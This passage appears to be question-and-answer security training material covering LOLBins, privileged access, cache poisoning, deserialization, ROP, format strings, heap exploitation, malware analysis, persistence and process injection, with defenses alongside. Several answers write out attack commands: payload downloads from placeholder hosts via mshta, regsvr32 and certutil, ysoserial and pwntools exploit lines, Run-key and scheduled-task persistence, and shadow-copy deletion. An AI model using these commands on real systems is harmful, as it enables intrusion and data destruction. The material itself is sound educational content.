Why effective: Windows signed binaries trusted by AV/EDR; execution via legitimate process (wscript.exe, cscript.exe, regsvr32.exe) blends with normal activity; defender whitelists common system tools. Examples: Execution: rundll32.exe javascript:; (execute JavaScript); mshta.exe http://url/payload.hta (HTA application, bypasses AppLocker in some configs); regsvr32.exe /s /n /u /i:http://url/file.sct scrobj.dll (Squiblydoo technique -- regsvr32 fetches and executes COM scriptlet); wmic process call create cmd.exe /c whoami (remote process creation via WMI); certutil.exe -urlcache -f http://url/payload.exe C:\Windows\Temp\p.exe (download file via certutil); bitsadmin /transfer job /download /priority high http://url/payload.exe C:\Temp\p.exe (BITS transfer). Download: certutil -decode base64file.txt decoded.exe; expand archive.cab.; PowerShell -enc BASE64 (encoded command bypasses simple command line monitoring). Lateral movement: PsExec (legitimate admin tool); wmic /node:TARGET process call create cmd.exe; winrs -r:TARGET cmd.exe. Persistence: schtasks /create (scheduled task); reg add HKCU\...\Run /v startup /d payload.exe (registry run key -- legitimate registry tool). Bypass: installutil.exe (execute.NET assembly bypassing AppLocker); msbuild.exe project.xml (execute C# from MSBuild project). Detection: monitor commonly abused LOLBAS with unusual command lines; parent-child process anomalies; Microsoft Defender for Endpoint has LOLBAS detection built-in. LOLBAS project (lolbas-project.github.io): comprehensive catalog of LOLBins with examples.
What security controls should be in place for privileged access management?

Privileged Access Management (PAM): security controls for protecting and monitoring privileged accounts (domain admins, root, service accounts, database admins, cloud admin roles). Components: (1) Privileged Account Discovery: inventory all privileged accounts; many organisations have 3-5x more than expected; service accounts, shared admin accounts, forgotten local admin accounts. (2) Vault and rotation: store privileged credentials in encrypted vault (CyberArk, BeyondTrust, Thycotic/Delinea); rotate passwords automatically (daily or per-session); users check out credentials for limited duration; no one knows permanent passwords; eliminate hardcoded credentials in scripts and applications. (3) Just-in-Time (JIT) access: elevate to privileged role only when needed; request access for specific task; approve (manager, security team, automated policy); time-limited (2 hours, 8 hours); revoke automatically; Microsoft PIM (Privileged Identity Management) for Azure AD. (4) Session recording: record all privileged sessions (video and keystroke logging); searchable; audit trail; CyberArk PSM (Privileged Session Manager) proxies sessions; detect and alert on anomalous commands. (5) Tier model (Microsoft): Tier 0 (Domain Controllers, AD Admin roles -- highest trust); Tier 1 (Server admins, enterprise applications); Tier 2 (Workstation admins, user support); admin accounts have separate accounts per tier; Tier 0 admins cannot log into Tier 2 systems (contamination risk). (6) Privileged Access Workstations (PAWs): dedicated hardened workstations for admin tasks; no internet browsing or email; separate from general use computers; phishing-resistant MFA for admin access. Metrics: all privileged accounts in vault (%); rotation compliance; JIT adoption rate; session recording coverage; account usage anomalies.
Explain the security considerations for serverless and container architectures.

Serverless security (AWS Lambda, Azure Functions, Google Cloud Functions): attack surface: function code vulnerabilities (injection, dependency vulnerabilities); event data injection (SNS, SQS, API Gateway trigger data); overly permissive IAM roles; sensitive data in environment variables (visible in console); function-to-function attack (if one function compromised, pivot to others via shared IAM role); cold start timing attacks. Best practices: least privilege IAM role per function (not shared role); no sensitive data in environment variables (use SSM Parameter Store or Secrets Manager); input validation on all trigger event data; limit function timeout and memory; VPC isolation for functions accessing internal resources; enable CloudTrail for all Lambda invocations; use Lambda Powertools for structured logging with redaction of sensitive fields. Container security (Docker/Kubernetes): multi-layered security model: build time (image scanning with Trivy, Snyk -- CVEs in base image and packages), deploy time (admission controllers validate pod security, no privileged containers), runtime (Falco for system call anomaly detection). Pod Security Standards (Kubernetes): Privileged (no restrictions), Baseline (minimum restrictions, no privileged), Restricted (hardened -- no root, read-only root filesystem, no host namespace sharing); enforce via Pod Security Admission controller. Runtime protection: Falco (CNCF project): eBPF-based monitoring of system calls inside containers; alert on shell spawned in container, file write to unexpected path, sensitive file access; Sysdig Secure, Aqua Security for commercial runtime protection. Image security: scan images in CI pipeline before push; sign images (cosign, Notary); use minimal base images (distroless, Alpine -- smaller attack surface); never run as root inside container; no secrets in Dockerfile or image layers.
What is threat intelligence sharing and what standards exist?

Threat intelligence sharing: organisations and governments exchange threat indicators and attack information to collectively improve defenses. Benefits: one organisation learns from another's breach; defenders share IOCs before attackers reuse infrastructure; scale (small organisations benefit from larger organisations' intelligence). Sharing communities: ISACs (Information Sharing and Analysis Centers): sector-specific sharing; FS-ISAC (financial services); H-ISAC (healthcare); E-ISAC (energy); MS-ISAC (state/local government); membership required, often free for critical sectors. CISA: US government shares threat intelligence publicly (US-CERT alerts, AA## reports, Known Exploited Vulnerabilities catalog); AIS (Automated Indicator Sharing) -- machine-speed sharing of indicators with critical infrastructure owners. Vendor threat intel: Mandiant Advantage, CrowdStrike Adversary Intelligence, Recorded Future, Intel471; paid; richer context and attribution. Technical standards: STIX (Structured Threat Information eXpression): JSON-based format for expressing threat data; Objects: Indicator (IOC), TTP (technique), Campaign, Threat Actor, Malware, Vulnerability, Relationship; links objects to express relationships (campaign uses malware, threat actor uses TTP). TAXII (Trusted Automated eXchange of Indicator Information): transport protocol for STIX over HTTPS; pull (client polls server for new indicators), push (server pushes to clients); Collections and Channels. MISP (Malware Information Sharing Platform): open-source threat intelligence sharing platform; popular in government and critical infrastructure; STIX/TAXII compatible; correlation engine; taxonomies (tlp: traffic light protocol -- white, green, amber, red -- sharing scope). TLP (Traffic Light Protocol): TLP:RED (recipient only, not forward); TLP:AMBER (limited sharing within organisation and need-to-know partners); TLP:GREEN (community sharing); TLP:CLEAR (public).
How do you build a secure software development lifecycle (SSDLC)?

SSDLC integrates security at every phase of software development rather than testing at end. Phases: (1) Requirements: security requirements alongside functional requirements; abuse cases (how could an attacker misuse this feature?); regulatory requirements (GDPR data minimisation, PCI DSS encryption); threat modeling to identify risks early. (2) Design: security architecture review; apply security design patterns (defence in depth, least privilege, fail secure, separation of duties); threat model update; design approval gate for security risks. (3) Development: secure coding standards and guidelines (language-specific -- OWASP Cheat Sheet Series); pre-commit hooks for secrets detection (truffleHog, git-secrets); IDE security plugins (SonarLint, Checkmarx IDE plugin -- real-time feedback); peer code review checklist includes security; developer security training (OWASP Top 10, language-specific vulnerabilities). (4) Testing: SAST in CI (Semgrep, CodeQL -- runs on every PR; fail on new Critical/High findings); DAST against test environment (ZAP, Burp); SCA for dependency vulnerabilities (Snyk, Dependabot); secret scanning (GitHub Advanced Security, TruffleHog); infrastructure as code scanning (tfsec for Terraform, Checkov). (5) Deployment: security in deployment pipeline; image scanning before container deployment; infrastructure configuration validation; secrets management (not hardcoded, from vault); deployment approval for production changes. (6) Operations: runtime monitoring (RASP, WAF, EDR); vulnerability management (periodic scanning, CVE monitoring); penetration testing (annual external pentest, continuous bug bounty); incident response readiness. Metrics: DAST findings per sprint; time to fix Critical SAST findings; security training completion rate; mean time to patch Critical CVEs.
Explain how bug bounty programs work and how to be effective in them.

Bug bounty programs: organisations pay security researchers for reporting valid vulnerabilities. Platforms: HackerOne, Bugcrowd, Intigriti, Synack (curated/private), Cobalt.io; some programmes run directly on company website. Programme types: Private (invitation-only; less competition; easier to find bugs); Public (anyone can participate; most bugs found but also most competition and noise). Scope: defines what can be tested (domains, IP ranges, applications, mobile apps); out-of-scope assets (third-party services, employee personal accounts); out-of-scope vulnerability classes (denial of service, physical attacks, social engineering in most programmes). Rewards: typically by severity: Critical ($10,000-$100,000+); High ($2,000-$10,000); Medium ($500-$2,000); Low ($100-$500); Informational ($0); top programmes (Google, Microsoft, Apple, Meta) pay $100K+ for exceptional findings. Methodology for success: start with reconnaissance (identify all in-scope assets, not just obvious targets); focus on less-tested areas (mobile apps, APIs, new features); learn the application's specific attack surface; look for business logic flaws (harder to detect with automated scanners); read previous public disclosures and CVEs for the same organisation (find variants). Reporting: clear, concise title; description of vulnerability class; step-by-step reproduction instructions; proof of concept (screenshot, HTTP request/response, video); impact statement (what could attacker do?); suggested remediation. Common mistakes: report duplicates (check if already reported); out-of-scope issues; missing evidence; unrealistic impact claims; aggressive follow-up before triage window.
How do you exploit web cache poisoning?

Web cache poisoning: manipulate cached response to serve malicious content to other users. How caches work: reverse proxy (CDN, Varnish, Nginx caching) stores responses keyed by URL and some headers; serves cached response to subsequent requests matching cache key; time-to-live (TTL) determines how long cached. Cache poisoning attack: inject malicious content in a response that gets cached; subsequent users receive poisoned cache entry. Requirements: (1) Identify cache key: what determines cache key? URL, Host header, Accept-Encoding, Cookie (some headers are unkeyed -- not part of cache key but included in response). (2) Unkeyed headers: if cache keys on URL only but server uses X-Forwarded-Host to construct redirect URLs: send request with X-Forwarded-Host: attacker.com; cache stores response reflecting attacker.com in Location header; subsequent users get redirect to attacker.com. (3) Parameter cloaking: cache keys on ?key=value; send ?key=value&utm_source=PAYLOAD; utm_source is unkeyed; server processes all parameters; payload reflected in response; cache stores with key on first param only. (4) Host header poisoning: if unkeyed and reflected in password reset link: send Host: attacker.com; victim who requests password reset has link pointing to attacker.com; receive token at attacker-controlled server. (5) HTTP response splitting: inject CRLF characters to add malicious headers to cached response. Finding unkeyed inputs: Param Miner (Burp extension) -- automatically discovers unkeyed headers and parameters; sends requests with varied headers and detects which affect response without changing cache key. Impact: cache-poisoned XSS affects all users loading cached page; cache-poisoned redirect for phishing; cache deception (force caching of authenticated response). Defense: validate and sanitise all inputs reflected in response; ensure all response-influencing headers are in cache key; set Vary header correctly.
What is deserialization and how do you find insecure deserialization vulnerabilities?

Deserialization: converting byte stream back to object; inverse of serialisation (object to bytes for storage or transmission). Insecure deserialization (OWASP A08): application deserialises untrusted data; attacker manipulates serialised data to attack application. How to find: (1) Identify serialised data in HTTP traffic: Burp Proxy -- look for base64-encoded data in cookies, POST bodies, hidden form fields; Java serialised objects: bytes starting with rO0 (base64) or 0xACED0005 (hex magic bytes);.NET ViewState: /wEy... prefix; Python Pickle: opcode starts with c (callable) or ( for tuples; PHP serialised strings: O:8:UserData:{...} format. (2) Test modification: change serialised object property (role, isAdmin, userId); observe if application respects modified values -- object injection vulnerability even without RCE. (3) Test for gadget chains: for Java, use ysoserial to generate payload: java -jar ysoserial.jar CommonsCollections6 whoami | base64; send as serialised Java object in place of original; if vulnerable and gadget chain available, command executes. (4) PHP object injection: change __PHP_Incomplete_Class to a class with magic methods (__wakeup, __destruct, __toString) that perform dangerous operations; search source code for classes with magic methods + dangerous operations (exec, eval, file write). Finding blind deserialization: if no output visible, use DNS callback: java -jar ysoserial.jar URLDNS http://unique-id.burpcollaborator.net | base64; send payload; check Collaborator for DNS lookup; confirms deserialization occurs. Remediation: never deserialise untrusted input; if must, use allowlists of acceptable classes (Java deserialization filter); use safe formats (JSON, XML with schema validation) instead of native serialisation; digital signatures/HMAC on serialised data before deserialising.
Explain security testing for smart contracts on Ethereum.

Smart contract security: programs deployed on blockchain (Ethereum, Solana, etc.); immutable after deployment; high financial stakes (DeFi protocols hold billions). Common vulnerabilities: (1) Reentrancy: contract A calls contract B; B calls back into A before A finishes; A state not updated yet; B withdraws multiple times; DAO hack (2016, $60M). Defense: Checks-Effects-Interactions pattern (update state before external calls); ReentrancyGuard modifier (mutex). (2) Integer overflow/underflow: Solidity <0.8.0 did not auto-revert on overflow; 255 + 1 = 0 for uint8; use SafeMath library or Solidity 0.8+. (3) Access control: functions missing onlyOwner or similar modifier; anyone can call admin functions; transfer ownership to address(0) accidentally. (4) Oracle manipulation: smart contracts use price oracles (Chainlink, Uniswap TWAP); if attacker manipulates spot price (flash loan attack), oracle provides wrong price; borrow much more than collateral worth. (5) Flash loan attacks: borrow large amount from flash loan protocol (no collateral if repaid in same transaction); manipulate markets; exploit price oracle; repay loan; profit; $100M+ stolen across multiple protocols. (6) Front-running: Ethereum mempool is public; attacker sees pending transaction, submits same transaction with higher gas fee; executes first; sandwich attacks on DEX trades. (7) Timestamp dependence: block.timestamp controllable by miners within 15 seconds; do not use for randomness or time-sensitive logic. Testing tools: Slither (static analysis -- detects reentrancy, access control, other patterns); Mythril (symbolic execution); Echidna (fuzzing -- property-based); Foundry/Hardhat for unit tests; Forta (runtime attack detection); formal verification (Certora Prover). Auditing: major protocols pay $50K-$1M for security audits before launch; bug bounties (Immunefi) pay millions for critical smart contract vulnerabilities.
How do you perform hardware security assessment?

Hardware security assessment: evaluate physical devices for vulnerabilities. Physical inspection: open device; document PCB (Printed Circuit Board) components; identify: processor (ARM, MIPS, x86), SoC, memory chips (eMMC, NAND flash), debugging headers (JTAG, SWD, UART). UART serial console: most embedded devices have UART debug port; 3-4 pins (TX, RX, GND, optional VCC); find with multimeter (GND = continuity to ground; TX = active with data during boot; VCC = 3.3V or 5V); connect USB-to-UART adapter (FTDI FT232R); open minicom or screen at 115200 baud; watch boot log; often drops to root shell without authentication. JTAG debugging: JTAG (Joint Test Action Group): boundary scan interface for testing and debugging; JTAG TAP (Test Access Port) -- TDI, TDO, TCK, TMS, TRST; identify pinout with JTAGulator (hardware tool) or openocd + JTAGulator firmware; connect with OpenOCD + GDB: read/write memory, halt processor, extract firmware, patch code at runtime. Chip-off / eMMC reading: remove storage chip from board; use chip reader (Easy JTAG, RT-SE9, Medusa Pro for BGA chips); read raw flash memory; extract filesystem; find credentials, keys, firmware. Fault injection: voltage glitching (undershoot VCC briefly to cause processor to skip instruction); clock glitching (inject faster clock pulse to confuse pipeline); used to bypass secure boot, extract AES keys; equipment: ChipWhisperer (open-source). Side-channel attacks: power analysis (measure current during AES key schedule; correlate with key hypothesis); EM (electromagnetic) analysis; timing attacks on constant-time implementations. Cryptographic key extraction: differential power analysis on smartcards and HSMs; academic attacks on specific hardware; ChipWhisperer framework for power analysis.
What is mobile malware and how does it operate?

Mobile malware types and operation: Android malware: APK files distributed via third-party app stores, phishing links, compromised legitimate apps, drive-by download. Types: (1) Stalkerware: monitors user location, calls, messages; often marketed as parental control; privacy violation; hides icon; accesses contacts, SMS, camera, microphone. (2) Banking trojans: overlay attack -- shows fake login screen over legitimate banking app; captures credentials; Anubis, Alien, Cerberus, Teabot; request Accessibility Service permission (grants broad UI control); steal 2FA SMS codes; Bankbot family stole from 1000+ banks. (3) Ransomware: encrypts files; demands payment; Android limited filesystem access restricts encryption to user-accessible files; ScreenLocker variant locks screen instead. (4) SMS/Call premium fraud: send SMS to premium numbers; subscribe to premium services; generate revenue for attacker; user gets bill. (5) RAT (Remote Access Trojan): full device control; camera/mic access; location tracking; SpyNote, GravityRAT. (6) Adware: display persistent ads; less malicious but annoying; often in fake app stores. Persistence: Android: foreground service (shows notification, prevents system killing); receive BOOT_COMPLETED broadcast to restart on reboot; Device Admin privilege (hard to uninstall). iOS: more restricted; malware less common; generally requires jailbreak or enterprise certificate abuse; MDM profiles used for monitoring; XcodeGhost (2015) supply chain attack on iOS apps compiled with malicious Xcode version. Detection: Google Play Protect scans apps; VirusTotal Mobile; MobSF for analysis; review permissions requested; check battery/data usage by app; unknown app sources indication.
What is return-oriented programming (ROP) and how do you build a ROP chain?

ROP (Return-Oriented Programming): exploit technique that chains small existing code snippets (gadgets) ending in RET instruction to execute arbitrary logic without injecting new code; defeats W^X/NX/DEP (non-executable stack). Why needed: modern OSes mark stack and heap as non-executable (NX bit on Linux, DEP on Windows); cannot jump to shellcode on stack; ROP reuses existing executable code. Gadgets: sequences of 1-5 instructions ending in RETN (0xC3); found throughout binary and its loaded libraries (libc, kernel32, ntdll); example gadgets: pop eax; ret (load value into eax); pop ebx; ret; mov [eax], ebx; ret (write to memory); int 0x80; ret (Linux syscall). Building ROP chain: (1) Find gadgets: ROPgadget --binary /bin/bash (enumerate gadgets); ropper -f binary; pwndbg gadgets command inside GDB. (2) Identify goal: call system(/bin/sh); or execve(/bin/sh, NULL, NULL). (3) Chain construction: arrange gadget addresses on stack; each RET pops next gadget address; control register values with pop gadgets; call libc function by jumping to its address with correct arguments set up. (4) Address resolution: need to defeat ASLR: information leak to get libc base address (format string bug leaks GOT entry; heap pointer leak; format string %p.%p.%p pattern); add offset from libc base to get gadget addresses at runtime. Tools: pwntools (Python library for exploit development): from pwn import *; p = process('./vuln'); rop = ROP(binary); chain constructed with API; rop.call(binary.symbols.puts, [binary.got.puts]) pattern. Ret2libc: simplest ROP; overflow buffer; overwrite return address with system() address; argument: /bin/sh string address in libc; shell spawned without NX bypass complexity.
How do you exploit a format string vulnerability?

Format string vulnerability: when user-controlled string passed directly to printf-family function as format string (printf(buf) instead of printf(%s, buf)). What attackers can do: read from stack (%p.%p.%p.%p -- leak stack values including return addresses and canaries); read from arbitrary addresses (%s reads string at specified stack address; use to leak GOT entries; calculate libc base for ASLR bypass); write to arbitrary addresses (%n writes number of characters printed to address on stack -- powerful write primitive). Exploitation: (1) Count offset: printf(%p.%p.%p.%p -- 100 %p's); identify where your input appears on stack (direct parameter access: %7$p to read 7th argument directly). (2) Leak canary: if stack canary at known offset N, use %N$p to read it; now canary value known for stack overflow exploit. (3) Leak libc address: GOT entry address known from binary; calculate offset to pass GOT address as stack argument; use %N$s to read string at that address (pointer to libc function = libc address); compute libc base. (4) Arbitrary write: %n writes COUNT-OF-CHARS-PRINTED to address on stack; set up desired value by printing that many chars (hhn writes 1 byte; hn writes 2 bytes; n writes 4 bytes); overwrite GOT entry for printf with system() address; next printf call becomes system call; pass /bin/sh as format string argument for shell. Example: printf(format_string) where format_string = AAAA%7$n overwrites address AAAA (in EAX on x86) with 4 (number of characters printed). Modern glibc: %n disabled by default via FORTIFY_SOURCE; format string bugs primarily useful for reads in modern exploitation. Detection: use -Wformat=2 compiler flag; static analysis; ASAN/UBSan detection.
Explain heap exploitation techniques including use-after-free.

Heap exploitation: attack dynamically allocated memory (malloc/free). Heap memory manager: glibc malloc uses bins (free chunks organised by size) and chunks (allocated + free regions with metadata: size, prev_size, flags). Use-After-Free (UAF): program uses pointer to memory after it was freed; freed chunk returned to free list; attacker causes different allocation to reuse same memory; attacker-controlled data now occupies structure that still-live pointer accesses; control struct function pointers or type confusion. Heap spray: fill heap with NOP sleds + shellcode; large region increases probability that any exploited pointer lands in controlled data; less precise than targeted allocation. Heap grooming/feng shui: carefully craft allocations and frees to place victim chunk adjacent to or between attacker-controlled allocations; overflow victim chunk into adjacent metadata or data. Tcache (glibc 2.26+): per-thread cache of recently freed chunks (7 per size); tcache_entry has fd pointer to next free chunk; if UAF into tcache chunk: overwrite fd pointer; next malloc of same size returns attacker-specified address (tcache poisoning); write arbitrary data to that address; bypass: tcache has no metadata integrity checks in early versions. Safe-linking (glibc 2.32+): fd pointer XOR'd with (heap_base >> 12) before storing; attacker must know heap base to poison; raised bar for exploitation. Fastbin dup: double-free in fastbin (small chunks <128 bytes); allocate chunk, free, free again (with freeing another chunk in between to pass double-free check); same chunk appears twice in fastbin list; two mallocs return same chunk; one controls data that other program uses as pointer. House of Force: overflow into top chunk (wilderness) to set size = 0xFFFFFFFF; subsequent allocation of any size wraps around; puts top chunk anywhere in address space; allocate from arbitrary address. Tools: pwndbg (heap visualisation in GDB); PEDA; pwntools heap utilities.
What is ASLR and how do attackers bypass it?

ASLR (Address Space Layout Randomisation): OS security feature that randomises base addresses of executable, stack, heap, and libraries at each process start; makes return-to-libc and ROP harder since absolute addresses unknown. Linux: /proc/sys/kernel/randomize_va_space: 0=off, 1=partial (stack+libs, not heap), 2=full (all); 28-bit entropy on 64-bit systems = 268 million possible addresses per library; practically unbrutable. Windows: ASLR per-module; modules must be compiled with /DYNAMICBASE; low entropy (8 bits = 256 positions) in 32-bit Windows makes brute-force feasible. Bypass techniques: (1) Information leaks: most powerful bypass; print/leak a stack address from stack canary position, libc function pointer from GOT, heap chunk pointer; calculate base address; use leaked address for ROP chain construction; format string bug is classic leak primitive. (2) Partial overwrite: if program crashes and restarts (fork-based server, e.g., PHP-FPM, Apache prefork) -- child inherits parent address space layout; lower 12 bits of address never randomised (page alignment); overwrite only 1-2 bytes of return address; limited entropy to brute force (256 or 4096 attempts typical -- often feasible). (3) Heap spraying: allocate many objects at predictable pattern; improves odds target address contains shellcode or controlled data. (4) JIT spraying: in browser/JVM: JIT-compiled code placed at predictable locations; use JIT sled of fixed-point XOR instructions that decode to shellcode as side effect. (5) Library mapping information: some applications leak address via debug output, error messages, environment variables; use proc/maps if local code execution already achieved. (6) Non-ASLR module: if one loaded DLL lacks /DYNAMICBASE (common in older apps with embedded legacy components), use its fixed addresses for ROP gadgets; entire chain built from that module.
How do you write a basic buffer overflow exploit?

Buffer overflow exploitation: classic example on 32-bit Linux without protections. Vulnerable program: char buf[64]; gets(buf); -- reads unlimited input into 64-byte buffer. Memory layout above buf on stack: buf[64], saved EBP[4], saved EIP[4] = return address. Step 1 -- find offset: run program in GDB; send cyclic pattern (pwntools cyclic(200) or Metasploit pattern_create); program crashes with EIP = some bytes from pattern; run cyclic_find(value) or pattern_offset to find offset to EIP = 72 bytes (64 + 4 EBP + 4 EIP). Step 2 -- confirm control: send A*72 + BBBB; EIP = 0x42424242 on crash; confirmed control. Step 3 -- shellcode or ret2libc: if NX disabled: find JMP ESP gadget (opcode FFE4); place shellcode after padding; return to JMP ESP which jumps to shellcode. If NX enabled: ret2libc -- send padding(72) + system_addr(4) + exit_addr(4) + binsh_addr(4); system() called with /bin/sh argument; shell spawned. pwntools exploit: from pwn import *; io = process('./vuln'); payload = flat({0: b'A'*72, 72: p32(system_addr), 76: p32(exit_addr), 80: p32(binsh_addr)}); io.sendline(payload); io.interactive(). Step 4 -- disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space; find system and /bin/sh with: ldd./vuln (libc base); readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system; strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh. Real world: same concepts apply but with ASLR + NX + canary + PIE -- each protection adds step: leak canary, leak libc base, build ROP chain, jump to one_gadget or system.
How do you perform static malware analysis?

Static malware analysis: examine malware without executing it. (1) File identification: file command (Linux) or TrID (Windows) -- identify file type from magic bytes regardless of extension; binwalk for embedded files; exiftool for metadata. (2) Hashing: MD5/SHA256 hash for identification and VirusTotal lookup (upload hash not file for OPSEC); SSDeep fuzzy hash for similarity to known malware families. (3) String extraction: strings -a -n 6 malware.exe (minimum 6 char strings); look for: URLs, domains, IP addresses (C2 indicators); file paths (persistence locations, dropped files); registry keys; API function names (imports reveal capabilities); error messages (help attribute malware family); PDB paths (debug paths reveal developer info). (4) PE analysis (Windows): PEStudio (free, comprehensive); PE structure: DOS header, PE header, section table, sections (.text=code,.data=global data,.rsrc=resources,.rdata=read-only data); suspicious: section with high entropy (packed/encrypted); non-standard section names; import table: which API functions used? (CreateRemoteThread = injection; WriteProcessMemory = injection; VirtualAllocEx = inject; RegSetValueEx = registry persistence; WinInet/WinHTTP APIs = network activity; CryptEncrypt = ransomware indicator). (5) Import/Export table: if very few imports (LoadLibrary, GetProcAddress only) = dynamic loading/obfuscation; if no suspicious imports despite obvious malware = packed (uses runtime unpacking). (6) Signature scanning: YARA rules against file; detect known malware families; write custom rules from identified patterns. (7) Disassembly: IDA Pro, Ghidra, Binary Ninja, Radare2; read assembly without executing; identify key functions; main, WinMain entry point; follow execution flow; identify anti-analysis: TEB walk for import resolution, PEB.NtGlobalFlag check (anti-debug), timing checks.
How do you perform dynamic malware analysis?

Dynamic malware analysis: execute malware in controlled environment and observe behaviour. Safe environment: isolated VM (VMware, VirtualBox, KVM); snapshots for clean state; network: either isolated (no external) or via INetSim/FakeNet-NG (simulate internet services). Host monitoring tools: Process Monitor (Procmon): real-time file system, registry, process, network activity; filter by PID; capture all operations during execution; export to CSV for analysis. Process Hacker / Process Explorer: view running processes, DLLs loaded, network connections, memory regions, handles; detect injected processes (parent-child inconsistencies). Regshot: snapshot registry before and after execution; compare; identify all registry changes. Wireshark: capture all network traffic; identify C2 communications, DNS queries, data exfiltration; apply protocol filters. Network simulation: INetSim: simulate HTTP, FTP, DNS, SMTP on localhost; malware connects to simulated services; observe requests; intercept C2 protocol. FakeNet-NG: Windows-native; similar to INetSim; redirect all DNS to localhost; respond to connection attempts; log and display traffic. Process behaviour: watch for: process spawning (cmd.exe, powershell.exe from Office process = macro malware); file creation (dropped payloads in %TEMP%, %APPDATA%, system dirs); registry writes (HKCU/HKLM Run keys = persistence); scheduled task creation; service installation; network connections with suspicious domains. Anti-analysis evasion: VM detection (CPUID check, RDTSC timing, registry artifacts VMware/VBox, process list check for Wireshark.exe); sleep calls (malware sleeps to outlast sandbox); process injection (malicious code in svchost -- monitor all processes not just malware PID). Automated sandboxes: Cuckoo Sandbox, any.run, Hybrid Analysis, Joe Sandbox -- submit sample; receive automated report with IOCs, network traffic, dropped files.
Explain common malware persistence mechanisms on Windows.

Windows persistence mechanisms: Run registry keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Run; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run; values here execute at user logon (HKCU) or any user logon (HKLM); requires admin for HKLM; simple, well-known, detected by most AV. RunOnce, RunServices, RunServicesOnce: similar; less commonly monitored. Scheduled tasks: schtasks /create /sc ONLOGON /tn TaskName /tr C:\path\payload.exe; can trigger on system start, user logon, time interval; SYSTEM privilege tasks possible; stored in C:\Windows\System32\Tasks; view with schtasks /query /fo LIST /v. Services: sc create MyService binpath= C:\path\payload.exe start= auto; starts at boot; SYSTEM privilege; visible in services.msc; sc qc MyService to enumerate. Startup folders: C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup; C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp (all users); drop shortcut or executable; less stealthy but simple. WMI subscriptions: WMI event subscriptions survive reboot; __EventFilter + __EventConsumer + __FilterToConsumerBinding; trigger on event (system startup, process creation, time); no new files or registry keys visible to simple monitors; harder to detect; PowerShell: Register-WMIEvent; detected by Sysmon Event 19/20/21. DLL hijacking: place malicious DLL in application search path before legitimate one; loaded at application startup; stealthy -- piggybacks on legitimate application. COM hijacking: override per-user COM server registration (HKCU\Software\Classes\CLSID\{GUID}); user-space, no admin required; triggered when legitimate application instantiates COM object. Office add-ins: malicious Office add-in (.xlam,.ppam,.dotm) registers in Office settings; runs when Office opens. Boot/logon scripts: Group Policy startup scripts; logon scripts defined in GPO or user profile.
How does ransomware encrypt files and what are defensive measures?

Ransomware encryption: modern ransomware uses hybrid encryption for performance and security. Process: (1) Generate victim-specific asymmetric key pair (RSA-2048 or ECDH) locally; public key from attacker already embedded in binary. (2) Generate session symmetric key (AES-256) for file encryption -- fast for large files. (3) Encrypt each file with AES-256 (CBC or GCM mode); generate unique IV per file or per run. (4) Encrypt AES session key with victim RSA public key; embed encrypted session key in ransom note or file header. (5) Wipe original files (overwrite or delete after encryption). (6) Decryption: only possible with attacker RSA private key to decrypt AES key; no mathematical shortcut without key. Notable ransomware: WannaCry (EternalBlue propagation + AES+RSA encryption); REvil/Sodinokibi (RaaS platform); LockBit (fastest encryptor, uses I/O completion ports for speed); Conti (leaked builder); Ryuk (enterprise-targeted, manual deployment). Double extortion: encrypt AND exfiltrate data; threaten to publish if ransom not paid; Maze ransomware pioneered; now standard. Defensive measures: (1) Backups: offline, air-gapped backups tested regularly; ransomware targets VSS (Volume Shadow Copies) -- vssadmin delete shadows; 3-2-1 backup rule. (2) Privilege restriction: limit who can write to file shares; users should not have write access to entire share; compartmentalise data. (3) EDR with ransomware detection: honeypot files and directories; alert on mass file rename or encryption pattern. (4) Network segmentation: limit lateral movement before encryption stage; isolate backup infrastructure. (5) Immutable backups: WORM (Write Once Read Many) storage; Veeam hardened repository; AWS S3 Object Lock. Detection: monitor for vssadmin delete shadows (Sysmon Event 1); mass file renames with new extensions; high disk I/O from unusual process; PowerShell accessing file shares.
What is process injection and what are the common techniques?

Process injection: attacker code executed inside another legitimate process; evades detection by appearing as trusted process (svchost.exe, explorer.exe, lsass.exe). Classic injection: (1) OpenProcess (get handle to target process with PROCESS_ALL_ACCESS); (2) VirtualAllocEx (allocate memory in target process); (3) WriteProcessMemory (write shellcode to allocated memory); (4) CreateRemoteThread (create thread in target process to execute shellcode). DLL injection: WriteProcessMemory to write DLL path string; CreateRemoteThread with LoadLibraryA as start address pointing to DLL path string; target process loads attacker DLL. Reflective DLL injection: DLL loaded into memory without touching disk or calling LoadLibrary; DLL contains its own mini-loader (ReflectiveDLLInjection -- widely used by Metasploit/CS); evades disk-based detection. Process Hollowing (RunPE): create legitimate process (svchost.exe) in suspended state; unmap legitimate executable memory from process; write malicious executable into same address space; resume process; appears as svchost in task manager but runs malware. APC (Asynchronous Procedure Call) injection: QueueUserAPC to queue shellcode to execute when target thread enters alertable wait state; can inject into any thread that calls SleepEx or WaitForSingleObjectEx. Thread hijacking: OpenThread to suspend thread; GetThreadContext for register state; modify EIP/RIP to shellcode address; SetThreadContext; ResumeThread. Early Bird APC: create process suspended; allocate memory; write shellcode; queue APC before main thread initialises -- executes shellcode on thread alertable wait during process initialisation. Process Doppelganging: abuse Windows NTFS transactions (TxF); create transacted file write with malicious image; map image from transaction; rollback transaction (file reverts); process created from now-deleted transactional image; no artefact on disk. Detection: Sysmon Event 8 (CreateRemoteThread); Event 10 (ProcessAccess); cross-process memory writes; unsigned modules in process memory; thread start address in non-image regions.
How do you use Ghidra for reverse engineering?

